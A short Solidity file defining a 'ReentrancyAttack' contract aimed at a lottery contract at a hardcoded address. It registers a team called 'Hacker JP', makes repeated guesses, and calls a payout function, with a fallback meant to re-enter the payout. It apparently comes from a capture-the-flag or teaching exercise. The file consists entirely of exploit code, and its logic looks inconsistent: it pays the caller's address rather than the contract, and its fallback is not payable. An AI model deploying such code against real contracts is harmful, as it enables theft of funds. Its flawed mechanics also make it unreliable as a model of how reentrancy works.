// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface ILottery {
    function payoutWinningTeam(address _team) external returns (bool);
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
}

contract ReentrancyAttack {
    address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;

    fallback() external {
        ILottery(lotteryAddress).payoutWinningTeam(msg.sender);
    }

    function attack() public {
        ILottery(lotteryAddress).registerTeam(msg.sender, "Hacker JP", "password");
        ILottery(lotteryAddress).makeAGuess(msg.sender, 1);
        ILottery(lotteryAddress).makeAGuess(msg.sender, 1);
        ILottery(lotteryAddress).makeAGuess(msg.sender, 1);
        ILottery(lotteryAddress).makeAGuess(msg.sender, 1);
        ILottery(lotteryAddress).makeAGuess(msg.sender, 1);
        ILottery(lotteryAddress).makeAGuess(msg.sender, 1);
        ILottery(lotteryAddress).payoutWinningTeam(msg.sender);
    }
}